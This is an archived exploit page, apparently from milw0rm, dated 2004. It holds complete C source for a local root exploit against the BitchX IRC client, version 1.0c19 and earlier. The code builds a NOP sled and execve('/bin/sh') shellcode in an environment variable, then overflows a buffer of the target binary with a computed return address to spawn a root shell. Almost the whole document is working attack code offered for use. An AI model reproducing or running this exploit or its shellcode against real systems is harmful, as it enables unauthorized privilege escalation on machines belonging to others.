<html><head><title>BitchX 1.0c19 Local Root Exploit (suid?)</title></head><pre>// BitchX local-root by Sha0 (version 1.0c19 e inferiores -todas-)
// este exploit se lo dedico a mi chica.
// 0xC0000000-4-strlen(argv[1])-1-strlen(buffer)
// 2052 to the ret

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

char payload[69];
char sha0code[] =
 &quot;\xeb\x16\x5b\x31\xc0&quot;
 &quot;\x50\x53\xb0\x0b\x89&quot;
 &quot;\xdb\x89\xe1\x31\xd2&quot;
 &quot;\xcd\x80\x31\xc0\x40&quot;
 &quot;\x31\xdb\xcd\x80\xe8&quot;
 &quot;\xe5\xff\xff\xff\x2f&quot;
 &quot;\x62\x69\x6e\x2f\x73\x68&quot;;


void nopea (void);

int main (int argc, char **argv) {
 
 char *buff;
 char *arg1=&quot;bash&quot;;
 char *arg2=&quot;-c&quot;;
 char *arg[]={arg1,arg2,buff,NULL};
 char *env[]={&quot;TERM=xterm&quot;,payload,NULL};
 char offset[]=&quot;&quot;;
 char sret[4];
 unsigned long lret;
 int i;

 if (argc != 2) {
  fprintf (stdout,&quot;BitchX exploit Coded By Sha0\n&quot;);
  fprintf (stdout,&quot;ej: %s /usr/bin/BitchX\n\n&quot;,argv[0]);
  return (1);
 }

 buff = (char *)malloc (2100);
 bzero (buff,sizeof(buff));
 arg[2] = buff;
 
 nopea ();

 lret = 0xbffffffa - strlen(payload) - strlen(argv[1]);
 sret[0] = (0x000000ff &amp; lret);
 sret[1] = (0x0000ff00 &amp; lret) &gt;&gt; 8;
 sret[2] = (0x00ff0000 &amp; lret) &gt;&gt; 16;
 sret[3] = (0xff000000 &amp; lret) &gt;&gt; 24;

 for (i=0;i&lt;2088;i+=4) // 2088 tirando largo.
  memcpy (buff+i,sret,4);

 execve (argv[1],arg,env);
 perror (&quot;execve()&quot;);

 free (buff);
 return (0);
}


void nopea (void) {
        bzero (payload,sizeof(payload));
        memset (payload,0x90,sizeof(payload)-1);
        memcpy (payload+sizeof(payload)-strlen(sha0code)-1,sha0code,strlen(sha0code));
}

// milw0rm.com [2004-10-20]</pre></html>